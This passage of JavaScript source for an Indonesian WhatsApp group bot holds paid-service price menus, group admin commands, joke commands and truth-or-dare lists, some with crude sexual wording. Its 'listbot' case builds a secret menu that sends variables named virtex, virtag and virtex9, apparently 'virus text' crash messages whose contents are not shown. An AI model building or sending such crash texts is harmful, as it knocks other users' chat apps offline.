𝑰𝒏𝒈𝒊𝒏 𝑻𝒂𝒏𝒚𝒂 𝑯𝒂𝒓𝒈𝒂 𝑫𝒎 𝑳𝒂𝒊𝒏𝒏𝒚𝒂 ? 𝑪𝒉𝒂𝒕 𝑶𝒘𝒏𝒆𝒓 𝑮𝒘

웃 ＰＡＹＭＥＮ T  웃 
*⚠️GOPAY⚠️*

𝐖𝐀 : https://wa.me/message/IMGMIAUAWC54J1`
katalog(menu)
break
case 'jasashare':
case 'jasher':
menu = `
──────「 𝙅𝙖𝙨𝙖 𝙎𝙝𝙚𝙧 𝘽𝙮 𝘿𝙝𝙖𝙣𝙞 𝙂𝙖𝙣𝙨 」──────

❏ 𝑆ℎ𝑒𝑟 100 𝐺𝑟𝑢𝑝 ❏
➪ 𝟏𝐱 𝐒𝐡𝐞𝐫 : 𝟏𝐊
➪ ??𝐱 𝐒𝐡𝐞𝐫 : 𝟐𝐊
➪ 𝟑𝐱 𝐒𝐡𝐞𝐫 : ??𝐊
➪ 𝟒𝐱 𝐒𝐡𝐞𝐫 : 𝟒𝐊
➪ 𝟓𝐱 𝐒𝐡𝐞𝐫 : 𝟓𝐊

❏ 𝑆ℎ𝑒𝑟 200 𝐺𝑟𝑢𝑝 ❏
➪ 𝟏𝐱 𝐒𝐡𝐞𝐫 : 𝟐𝐊
➪ 𝟐𝐱 𝐒𝐡𝐞𝐫 : 𝟒𝐊
➪ 𝟑𝐱 𝐒𝐡𝐞𝐫 : 𝟔𝐊
➪ 𝟒𝐱 𝐒𝐡𝐞𝐫 : 𝟖𝐊
➪ 𝟓𝐱 𝐒𝐡𝐞𝐫 : 𝟏𝟎𝐊

❏ 𝑆ℎ𝑒𝑟 300 𝐺𝑟𝑢𝑝 ❏
➪ 𝟏𝐱 𝐒𝐡𝐞𝐫 : 𝟑𝐊
➪ 𝟐𝐱 𝐒𝐡𝐞𝐫 : 𝟔𝐊
➪ 𝟑𝐱 𝐒𝐡𝐞𝐫 : 𝟗𝐊
➪ 𝟒𝐱 𝐒𝐡𝐞𝐫 : 𝟏𝟐𝐊
➪ 𝟓𝐱 𝐒𝐡𝐞𝐫 : 𝟏𝟓𝐊

웃 ＰＡＹＭＥＮ T  웃 
*⚠️GOPAY⚠️*

𝐖𝐀 : https://wa.me/message/IMGMIAUAWC54J1`
katalog(menu)
break
case 'logojb':
menu = `
──────「 𝙇𝙤𝙜𝙤 𝙅𝙗 𝘽𝙮 𝘿𝙝𝙖𝙣𝙞 𝙂𝙖𝙣𝙨 」──────

➪ 𝐋𝐨𝐠𝐨 𝐉𝐛 : 𝟏𝐊 - 𝟑𝐊
➪ 𝐋𝐨𝐠𝐨 𝐕𝐞𝐤𝐭𝐨𝐫 : 𝟐𝐊 - 𝟓𝐊
➪ 𝐋𝐨𝐠𝐨 𝐉𝐛 𝐁𝐚𝐰𝐚 𝐆𝐨𝐩𝐚𝐲 : 𝟑𝐊 - 𝟓𝐊
➪ 𝐋𝐨𝐠𝐨 𝐂𝐨𝐥𝐥𝐚𝐛 : 𝟐𝐊 - 𝟒𝐊
➪ 𝐋𝐨𝐠𝐨 𝐂𝐡𝐢𝐛𝐢 : 𝟏𝐊 - 𝟓𝐊

❏ 𝙋𝙤𝙨𝙩𝙚𝙧 ❏

➪ 𝐏𝐨𝐬𝐭𝐞𝐫 𝐓𝐮𝐫𝐧𝐚𝐦𝐞𝐧 : 𝟐𝐊
➪ 𝐏𝐨𝐬𝐭𝐞𝐫 𝐎𝐩𝐞𝐧 𝐌𝐞𝐦𝐛𝐞𝐫 : 𝟑𝐊
➪ 𝐏𝐨𝐬𝐭𝐞𝐫 𝐉𝐨𝐤𝐢 𝐑𝐚𝐧𝐤 : 𝟐𝐊 - 𝟒𝐊
➪ 𝐏𝐨𝐬𝐭𝐞𝐫 𝐂𝐫 : 𝟐𝐊
➪ 𝐏𝐨𝐬𝐭𝐞𝐫 𝐉𝐮𝐚𝐥 𝐀𝐤𝐮𝐧 : 𝟑𝐊 - 𝟔𝐊

웃 ＰＡＹＭＥＮ T  웃 
*⚠️GOPAY⚠️*

𝐖𝐀 : https://wa.me/message/IMGMIAUAWC54J1`
katalog(menu)
break
case 'sewabotz':
menu = `
🔰 -----[ 「 𝑺𝒆𝒘𝒂 𝑩𝒚 𝑩𝒐𝒕𝒛 𝑫𝒉𝒂𝒏𝒊 」 ]----- 🔰
──────────────────────────────
◯ 𝘿𝙖𝙛𝙩𝙖𝙧 𝙎𝙚𝙬𝙖 𝘽𝙤𝙩
◯ 𝟏 𝑴𝒊𝒏𝒈𝒈𝒖 : 𝟏𝟎𝑲
◯ 𝟏 𝑩𝒖𝒍𝒂𝒏 : 𝟏𝟓𝑲
◯ 𝑷𝒆𝒓𝒎𝒂𝒏𝒆𝒏 : 𝟐𝟎𝑲
◯ 𝑷𝒆𝒎𝒃𝒂𝒚𝒂𝒓𝒂𝒏 𝑩𝒊𝒔𝒂 𝑴𝒆𝒍𝒂𝒍𝒖𝒊 : 𝑮𝒐𝒑𝒂𝒚
◯ 𝑺𝒊𝒔𝒕𝒆𝒎 𝑺𝒆𝒘𝒂 𝑩𝒐𝒕 : 𝑴𝒂𝒔𝒖𝒌 𝑮𝒄 𝑳𝒖𝒉 - 𝑱𝒂𝒅𝒊𝒊𝒏 𝑨𝒅𝒎𝒊𝒏 - 𝑻𝒇 - 𝑫𝒐𝒏𝒆
──────────────────────────────
◯ 𝑮𝒓𝒖𝒑 𝑩𝒐𝒕 : *https://chat.whatsapp.com/K4a8Sbkax26GkO7qikrkA4*
──────────────────────────────
◯ 𝒀𝒐𝒖𝒕𝒖𝒃𝒆 : *https://youtube.com/channel/UCcnWMxH0nUbArCCkqubUeHA*
──────────────────────────────
◯ 𝐖𝐀 : https://wa.me/message/IMGMIAUAWC54J1
──────────────────────────────
🔰 -----[「 𝑺𝒆𝒘𝒂 𝑩𝒚 𝑩𝒐𝒕𝒛 𝑫𝒉𝒂𝒏𝒊 」]----- 🔰
웃 ＰＡＹＭＥＮ T  웃 
*⚠️GOPAY⚠️*`
katalog(menu)
break
case 'listbot':
               list = []
               listmenu = [`${virtex}`,`${virtag}`,`${virtex9}`]
               listmenuu = [`${virtex}`,`${virtag}`,`${virtex9}`]
               nombor = 1
               startnum = 0
               for (let x of listmenu) {
               const yy = {title: '️LIST =️' + nombor++,
                    rows: [
                       {
                        title: `${listmenuu[startnum++]}`,
                        description: ``,
                        rowId: `${prefix}${x}`
                      }
                    ]
                   }
                        list.push(yy)
           }
               listmsg(from, `${ucapanWaktu}`, `RAHASIA`, list)
               break
//------------------< G R U P >-------------------
     case 'notif':
           Hisnu.updatePresence(from, Presence.composing)
           if (!isGroupAdmins && !isOwner)return reply(mess.admin)
           if (!isGroup) return reply(mess.only.group)
           teks = `Notif dari @${sender.split("@")[0]}\n*Pesan : ${body.slice(7)}*`
           group = await Hisnu.groupMetadata(from);
           member = group['participants']
           jids = [];
           member.map(async adm => {
           jids.push(adm.id.replace('c.us', 's.whatsapp.net'));
}) 
           options = {
              text: teks,
                 contextInfo: {
                    mentionedJid: jids
  },
} 
            await Hisnu.sendMessage(from, options, text)
            break
      case 'kick':
             if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
             if (!isGroupAdmins && !mek.key.fromMe)return reply(mess.admin)
             if (!isGroup) return reply(mess.only.group)
             kick(from, mentionUser)
             break
      case 'add':
             if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
             if (mek.message.extendedTextMessage === null || mek.message.extendedTextMessage === undefined) {
             entah = arg.split("|")[0]
             entah = entah.replace(new RegExp("[()+-/ +/]", "gi"), "")
             entah = `${entah}@s.whatsapp.net`
             Hisnu.groupAdd(from, [entah])
             } else {
             entah = mek.message.extendedTextMessage.contextInfo.participant
             Hisnu.groupAdd(from, [entah])
}
             break
      // case 'promote':
             // if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
             // if (mek.message.extendedTextMessage === null || mek.message.extendedTextMessage === undefined) return;
             // if (mek.message.extendedTextMessage.contextInfo.participant === undefined) {
             // entah = mek.message.extendedTextMessage.contextInfo.mentionedJid
             // if (entah.length > 0) {
             // var mems_ids = []
             // for (let ids of entah) {
             // mems_ids.push(ids)
// }
             // Hisnu.groupMakeAdmin(from, mems_ids)
             // } else {
             // Hisnu.groupMakeAdmin(from, entah)
// }
             // } else {
             // entah = mek.message.extendedTextMessage.contextInfo.participant
             // Hisnu.groupMakeAdmin(from, [entah])
// }
             // break
      // case 'demote':
             // if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
             // if (mek.message.extendedTextMessage === null || mek.message.extendedTextMessage === undefined) return;
             // if (mek.message.extendedTextMessage.contextInfo.participant === undefined) {
             // entah = mek.message.extendedTextMessage.contextInfo.mentionedJid
             // if (entah.length > 0) {
             // var mems_ids = []
             // for (let ids of entah) {
             // mems_ids.push(ids)
// }
             // Hisnu.groupDemoteAdmin(from, mems_ids)
             // } else {
             // Hisnu.groupDemoteAdmin(from, [entah[0]])
// }
             // } else {
             // entah = mek.message.extendedTextMessage.contextInfo.participant
             // Hisnu.groupDemoteAdmin(from, [entah])
// }
             // break
       case 'setgrupname':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              if (!isGroup) return reply(mess.only.group)
              if (!isBotGroupAdmins) return 
              if (args.length == 0) return reply(`Penggunaan ${prefix}setgrupname name`)
              Hisnu.groupUpdateSubject(from, q)
             .then((res) => reply(jsonformat(res)))
             .catch((err) => reply(jsonformat(err)))
              break
       case 'setdesc':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              if (!isGroup) return reply(mess.only.group)
              if (!isBotGroupAdmins) return reply(mess.only.Badmin)
              if (args.length == 0)  return reply(`Penggunaan ${prefix}setdesc desc`)
              Hisnu.groupUpdateDescription(from, q)
             .then((res) => reply(jsonformat(res)))
             .catch((err) => reply(jsonformat(err)))
              break
       case 'setppgrup':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              if (!isGroup) return reply(mess.only.group)
              if (!isBotGroupAdmins) return reply(mess.only.Badmin)
              if (isQuotedImage) {
              let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
              let media = await Hisnu.downloadMediaMessage(encmedia)
              Hisnu.updateProfilePicture(from, media)
             .then((res) => reply(jsonformat(res)))
             .catch((err) => reply(jsonformat(err)))
              } else {
              reply(`Kirim atau tag gambar dengan caption ${prefix}setppgrup`)
}
              break
       case 'me':
       case 'profile':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              let Levelnye = level.getLevelingLevel(sender, _level)
              let Xpluu = level.getLevelingXp(sender, _level)
              let requiredXplu = 10 * Math.pow(Levelnye, 2) + 50 * Levelnye + 100
              Hisnu.updatePresence(from, Presence.composing)
              try {
              profil = await Hisnu.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
              } catch {
              profil = errorImg
}
              thu = await Hisnu.getStatus(`${sender.split('@')[0]}@s.whatsapp.net`, MessageType.text)
              me = Hisnu.user
              uptime = process.uptime()
              profile = `-----[ *USER INFO* ]-----\n\n➸ *Username:* ${pushname}\n➸ *Status:* ${thu.status}\n➸ *Premium*: ${isPremium ? 'Ya' : 'No'}\n➸ *Admin*: ${isGroupAdmins ? 'Ya' : 'No'}\n➸ *Prefix :* Multi Prefix\n\n=_=_=_=_=_=_=_=_=_=_=_=_=\n\nYour progress:\n➸ *Level*: ${Levelnye}\n➸ *XP*: ${Xpluu} / ${requiredXplu}`
              buff = await getBuffer(profil)
              Hisnu.sendMessage(from, buff, image, {quoted: freply, caption: profile})
              break
       case 'afk': 
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              if (!isGroup) return reply(mess.only.group)
              if (isAfkOn) return reply('Woe Kalo Mau Afk Jangan Nimbrung di sini')
              const reason = q ? q : 'Nothing.'
              afk.addAfkUser(sender, time, reason, _afk)
              const aluty = `Fitur AFK berhasil *diaktifkan!*\n\n➸ *Ussername*: ${pushname}\n➸ *Alasan*: ${reason}`
              reply(aluty)
              break
       case 'infogrup':
       case 'infogrouup':
       case 'grupinfo':
       case 'groupinfo':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              if (!isGroup) return reply(mess.only.group)
              try {
              var pic = await Hisnu.getProfilePicture(from)
              } catch {
              var pic = 'https://i.ibb.co/X4cnYk9/4558413e1873.jpg'
}
              let ingfo = `*G R O U P I N F O*\n\n*Name :* ${groupName}\n*ID Grup :* ${from}\n*Dibuat :* ${moment(`${groupMetadata.creation}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n*Owner Grup :* @${groupMetadata.owner.split('@')[0]}\n*Jumlah Admin :* ${groupAdmins.length}\n*Jumlah Peserta :* ${groupMembers.length}\n*Welcome :* ${isWelkom ? 'Aktif' : 'Mati'}\n*AntiLink :* ${isAntiLink ? 'Aktif' : 'Mati'}\n*Desc :* \n${groupMetadata.desc}`
              Hisnu.sendMessage(from, await getBuffer(pic), image, {quoted: mek, caption: ingfo, contextInfo: {"mentionedJid": [groupMetadata.owner.replace('@c.us', '@s.whatsapp.net')]}})
              break
       case 'tagall':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              if (!isGroup) return reply(mess.only.group)
              if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.only.admin)
              let arr = [];
              let txti = `*[ TAG ALL ]*\n\n${q ? q : ''}\n\n`
              for (let i of groupMembers){
              txti += ` @${i.jid.split("@")[0]}\n`
              arr.push(i.jid)
}
              mentions(txti, arr, true)
              break
       //case 'kickall': // Anti Banned
              for (let i of groupMembers) {
              await kickMember(from, [i.jid])
}
              break
       case 'online':
       case 'listonline':
       case 'here':                
             if (!isGroup) return reply(`Only group`)
             try {
             let ido = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
             let online = [...Object.keys(Hisnu.chats.get(ido).presences), Hisnu.user.jid]
             Hisnu.sendMessage(from, 'List Online:\n' + online.map(v => '- @' + v.replace(/@.+/, '')).join `\n`, text, { quoted: mek, contextInfo: { mentionedJid: online }})
             } catch (e) {
             reply(`${e}`)
}
             break
      case 'hidetag':
             if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              if (!isGroup) return reply(mess.only.group)
              if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.only.admin)
             try {
             quotedText = mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation
             hideTag(from, `${quotedText}`)
             } catch {
             hideTag(from, `${q}`)
}
             break
      case 'sider':
             if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
             if(!isGroup) return reply(mess.only.group)
             try {
             infom = await Hisnu.messageInfo(from, mek.message.extendedTextMessage.contextInfo.stanzaId)
             tagg = []
             teks = `*• Dibaca oleh:*\n\n`
             for(let i of infom.reads){
             teks += '@' + i.jid.split('@')[0] + '\n'
             teks += `> ` + moment(`${i.t}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss') + '\n\n'
             tagg.push(i.jid)
}
             teks += `*• Tersampaikan pada:*\n\n`
             for(let i of infom.deliveries){
             teks += '@' + i.jid.split('@')[0] + '\n'
             teks += `> ` + moment(`${i.t}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss') + '\n\n'
             tagg.push(i.jid)
}
             mentions(teks, tagg, true)
             } catch (e) {
             console.log(color(e))
             reply('Reply chat bot!')
}
             break
//------------------< Fun >-------------------
       case 'wangy':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              if (!q) return
              qq = q.toUpperCase()
              awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
              reply(awikwok)
              break
       case 'mining':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              var mining = randomNomor(1000)
              atm.addKoinUser(sender, mining, _uang)
              await reply(`*Selamat Kamu Mendapatkan*: _Rp ${mining} 💰_`)
              break
       case 'waktu':
              reply(`Waktu Indonesia Barat: *${moment().utcOffset('+0700').format('HH:mm')}* WIB \nWaktu Indonesia Tengah: *${moment().utcOffset('+0800').format('HH:mm')}* WITA \nWaktu Indonesia Timur: *${moment().utcOffset('+0900').format('HH:mm')}* WIT`)
              break
       case 'cekmati':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              if (!q) return reply(mess.wrongFormat)
              predea = await axios.get(`https://api.agify.io/?name=${q}`)
              reply(`Nama : ${predea.data.name}\n*Mati Pada Umur :* ${predea.data.age} Tahun.\n\n_Cepet Cepet Tobat Bro Soalnya Mati ga ada yang tau_`)
              break
       case 'togel':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              reply(mess.wait)
              try {
              dataplai = await axios.get(`https://api.vhtear.com/togel&apikey=${setting.vhtearkey}`)
              dataplay = dataplai.data.result
              let tomgel = `*Huzzzzz*\n`
              for (let i = 0; i < dataplay.hasil.length; i++) {
              tomgel += `\n═════════════════\n\n*Negara* : ${dataplay.hasil[i].Negara}\n*Result* : ${dataplay.hasil[i].Senin}\n*Result* : ${dataplay.hasil[i].Selasa}\n*Result* : ${dataplay.hasil[i].Rabu}\n*Result* : ${dataplay.hasil[i].Kamis}\n*Result* : ${dataplay.hasil[i].Jumat}\n*Result* : ${dataplay.hasil[i].Sabtu}\n*Result* : ${dataplay.hasil[i].Minggu}\n`
}
              sendText(from, tomgel)
              } catch (err) {
              console.log(err)
}
              break
       case 'toxic':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              Toxic().then(toxic => {
              reply (toxic)
})
              break
        case 'citacita':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              const cita =['http://piyobot.000webhostapp.com/citacita1.mp3','http://piyobot.000webhostapp.com/citacita2.mp3','http://piyobot.000webhostapp.com/citacita3.mp3','http://piyobot.000webhostapp.com/citacita4.mp3','http://piyobot.000webhostapp.com/citacita5.mp3','http://piyobot.000webhostapp.com/citacita6.mp3','http://piyobot.000webhostapp.com/citacita7.mp3','http://piyobot.000webhostapp.com/citacita8.mp3','http://piyobot.000webhostapp.com/citacita9.mp3','http://piyobot.000webhostapp.com/citacita10.mp3','http://piyobot.000webhostapp.com/citacita11.mp3','http://piyobot.000webhostapp.com/citacita12.mp3','http://piyobot.000webhostapp.com/citacita13.mp3','http://piyobot.000webhostapp.com/citacita14.mp3','http://piyobot.000webhostapp.com/citacita15.mp3','http://piyobot.000webhostapp.com/citacita16.mp3','http://piyobot.000webhostapp.com/citacita17.mp3','http://piyobot.000webhostapp.com/citacita18.mp3','http://piyobot.000webhostapp.com/citacita19.mp3','http://piyobot.000webhostapp.com/citacita20.mp3','http://piyobot.000webhostapp.com/citacita21.mp3','http://piyobot.000webhostapp.com/citacita22.mp3','http://piyobot.000webhostapp.com/citacita23.mp3','http://piyobot.000webhostapp.com/citacita24.mp3','http://piyobot.000webhostapp.com/citacita25.mp3','http://piyobot.000webhostapp.com/citacita26.mp3','http://piyobot.000webhostapp.com/citacita27.mp3','http://piyobot.000webhostapp.com/citacita28.mp3','http://piyobot.000webhostapp.com/citacita29.mp3','http://piyobot.000webhostapp.com/citacita30.mp3','http://piyobot.000webhostapp.com/citacita31.mp3','http://piyobot.000webhostapp.com/citacita32.mp3','http://piyobot.000webhostapp.com/citacita33.mp3','http://piyobot.000webhostapp.com/citacita34.mp3','http://piyobot.000webhostapp.com/citacita35.mp3']
              const cita3 = cita[Math.floor(Math.random() * cita.length)]
              cita2 = await getBuffer(cita3)
              Hisnu.sendMessage(from, cita2, audio,{mimetype: 'audio/mp4', ptt:true, quoted: mek})
              break
       case 'apakah':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              apakah = body.slice(1)
              const apa =['Iya','Tidak','Bisa Jadi','Coba Ulangi']
              const kah = apa[Math.floor(Math.random() * apa.length)]
              Hisnu.sendMessage(from, '*Pertanyaan :* '+apakah+'\n*Jawaban :* '+ kah, text, { quoted: mek })
              break
       case 'rate':
       case 'nilai':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              rate = body.slice(1)
              const ra =['0','4','9','17','28','34','48','59','62','74','83','97','100','29','94','75','82','41','39']
              const te = ra[Math.floor(Math.random() * ra.length)]
              Hisnu.sendMessage(from, '*Pertanyaan :* '+rate+'\n*Jawaban :* '+ te+'%', text, { quoted: mek })
              break
       case 'gantengcek':
       case 'cekganteng':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              ganteng = body.slice(1)
              const gan =['10','30','20','40','50','60','70','62','74','83','97','100','29','94','75','82','41','39']
              const teng = gan[Math.floor(Math.random() * gan.length)]
              Hisnu.sendMessage(from, '*Pertanyaan :* '+ganteng+'\n*Jawaban :* '+ teng+'%', text, { quoted: mek })
              break
       case 'cantikcek':
       case 'cekcantik':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              cantik = body.slice(1)
              const can =['10','30','20','40','50','60','70','62','74','83','97','100','29','94','75','82','41','39']
              const tik = can[Math.floor(Math.random() * can.length)]
              Hisnu.sendMessage(from, '*Pertanyaan :* '+cantik+'\n*Jawaban :* '+ tik+'%', text, { quoted: mek })
              break
       case 'cekwatak':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              var namao = pushname
              var prfx = await Hisnu.getProfilePicture(sender)
              const watak = ['top deh pokoknya','penyayang','pemurah','Pemarah','Pemaaf','Penurut','Baik','baperan','Baik-Hati','penyabar','UwU','Suka Membantu']
              const wtk = watak[Math.floor(Math.random() * (watak.length))]
              const ratenyaasu = ['100%','95%','90%','85%','80%','75%','70%','65%','60%','55%','50%','45%','40%','35%','30%','25%','20%','15%','10%','5%']
              const akhlak = ratenyaasu[Math.floor(Math.random() * (ratenyaasu.length))]
              const sifat = ['Penolong','Suka Membantu','Saling Menolong','Perhatian','Ngak Cuek','Romantis','Dermawan','Cool','Peduli Kepada Sesama','Suka Berkata Kasar']
              const sft = sifat[Math.floor(Math.random() * (sifat.length))]
              const hobby = ['Memasak','Membantu Atok','Mabar','Nobar','Coli','Colmek','Sosmedtan','Membantu Orang lain','Nonton Anime','Nonton Drakor','Naik Motor','Nyanyi','Menari','Bertumbuk','Menggambar','Foto fotoan Ga jelas','Maen Game','Berbicara Sendiri']
              const hby = hobby[Math.floor(Math.random() * (hobby.length))]
              const kelebihan = ['Soleh dan Soleha','Pintar','Rajin','Teladan']
              const klbh = kelebihan[Math.floor(Math.random() * (kelebihan.length))]
              const tipe = ['cool','idaman','Alami','Keren','Ideal','Dia Bamget','normal','elite','epic','Legend']
              const typo = tipe[Math.floor(Math.random() * (tipe.length))]
              await reply(`[ INTROGASI SUKSES ]\n\n[Nama]:${namao}\n\n[Watak]:${wtk}\n\n[Akhlak✨]:${akhlak}\n\n[Sifat]:${sft}\n\n[Hobby]:${hby}\n\n[Tipe]:${typo}\n\n[Kelebihan]:${klbh}\n\nNote\n\n_ini hanya main main_`)
              break
       case 'hobby':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              hobby = body.slice(1)
              const by = hobby[Math.floor(Math.random() * hobby.length)]
              Hisnu.sendMessage(from, 'Pertanyaan : *'+hobby+'*\n\nJawaban : '+ by, text, { quoted: mek })
              break
       case 'bisakah':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              bisakah = body.slice(1)
              const bisa =['Bisa','Tidak Bisa','Coba Ulangi','MANA GW TAU']
              const keh = bisa[Math.floor(Math.random() * bisa.length)]
              Hisnu.sendMessage(from, '*Pertanyaan :* '+bisakah+'\n*Jawaban :* '+ keh, text, { quoted: mek })
              break
       case 'kapankah':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              kapankah = body.slice(1)
              const kapan =['Besok','Lusa','Tadi','4 Hari Lagi','5 Hari Lagi','6 Hari Lagi','1 Minggu Lagi','2 Minggu Lagi','3 Minggu Lagi','1 Bulan Lagi','2 Bulan Lagi','3 Bulan Lagi','4 Bulan Lagi','5 Bulan Lagi','6 Bulan Lagi','1 Tahun Lagi','2 Tahun Lagi','3 Tahun Lagi','4 Tahun Lagi','5 Tahun Lagi','6 Tahun Lagi','1 Abad lagi','3 Hari Lagi']
              const koh = kapan[Math.floor(Math.random() * kapan.length)]
              Hisnu.sendMessage(from, '*Pertanyaan :* '+kapankah+'\n*Jawaban :* '+ koh, text, { quoted: mek })
              break
       case 'truth':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              const trut =['Pernah suka sama siapa aja? berapa lama?','Kalau boleh atau kalau mau, di gc/luar gc siapa yang akan kamu jadikan sahabat?(boleh beda/sma jenis)','apa ketakutan terbesar kamu?','pernah suka sama orang dan merasa orang itu suka sama kamu juga?','Siapa nama mantan pacar teman mu yang pernah kamu sukai diam diam?','pernah gak nyuri uang nyokap atau bokap? Alesanya?','hal yang bikin seneng pas lu lagi sedih apa','pernah cinta bertepuk sebelah tangan? kalo pernah sama siapa? rasanya gimana brou?','pernah jadi selingkuhan orang?','hal yang paling ditakutin','siapa orang yang paling berpengaruh kepada kehidupanmu','hal membanggakan apa yang kamu dapatkan di tahun ini','siapa orang yang bisa membuatmu sange','siapa orang yang pernah buatmu sange','(bgi yg muslim) pernah ga solat seharian?','Siapa yang paling mendekati tipe pasangan idealmu di sini','suka mabar(main bareng)sama siapa?','pernah nolak orang? alasannya kenapa?','Sebutkan kejadian yang bikin kamu sakit hati yang masih di inget','pencapaian yang udah didapet apa aja ditahun ini?','kebiasaan terburuk lo pas di sekolah apa?']
              const ttrth = trut[Math.floor(Math.random() * trut.length)]
              truteh = await getBuffer(`https://i.ibb.co/X4cnYk9/4558413e1873.jpg`)
              Hisnu.sendMessage(from, truteh, image, { caption: '*Truth*\n\n'+ ttrth, quoted: mek })
              break
       case 'dare':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              const dare =['Kirim pesan ke mantan kamu dan bilang "aku masih suka sama kamu','telfon crush/pacar sekarang dan ss ke pemain','pap ke salah satu anggota grup','Bilang "KAMU CANTIK BANGET NGGAK BOHONG" ke cowo','ss recent call whatsapp','drop emot "??💨" setiap ngetik di gc/pc selama 1 hari','kirim voice note bilang can i call u baby?','drop kutipan lagu/quote, terus tag member yang cocok buat kutipan itu','pake foto sule sampe 3 hari','ketik pake bahasa daerah 24 jam','ganti nama menjadi "gue anak lucinta luna" selama 5 jam','chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia "i lucky to hv you','prank chat mantan dan bilang " i love u, pgn balikan','record voice baca surah al-kautsar','bilang "i hv crush on you, mau jadi pacarku gak?" ke lawan jenis yang terakhir bgt kamu chat (serah di wa/tele), tunggu dia bales, kalo udah ss drop ke sini','sebutkan tipe pacar mu!','snap/post foto pacar/crush','teriak gajelas lalu kirim pake vn kesini','pap mukamu lalu kirim ke salah satu temanmu','kirim fotomu dengan caption, aku anak pungut','teriak pake kata kasar sambil vn trus kirim kesini','teriak " anjimm gabutt anjimmm " di depan rumah mu','ganti nama jadi " BOWO " selama 24 jam','Pura pura kerasukan, contoh : kerasukan maung, kerasukan belalang, kerasukan kulkas, dll']
              const der = dare[Math.floor(Math.random() * dare.length)]
